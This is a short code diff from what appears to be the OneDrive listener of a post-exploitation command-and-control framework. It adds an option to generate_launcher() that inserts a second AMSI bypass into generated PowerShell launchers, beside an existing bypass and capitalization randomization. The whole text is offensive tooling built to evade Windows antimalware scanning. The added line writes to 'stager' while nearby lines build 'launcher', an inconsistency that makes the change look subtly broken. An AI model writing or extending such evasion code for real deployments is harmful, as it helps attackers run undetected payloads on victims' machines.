@@ -169,7 +169,7 @@ class Listener:
 
         return True
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         if not language:
             print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")
 
@@ -199,6 +199,9 @@ class Listener:
                     # @mattifestation's AMSI bypass
                     if AMSIBypass:
                         launcher += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
                     launcher += "};"
                     launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
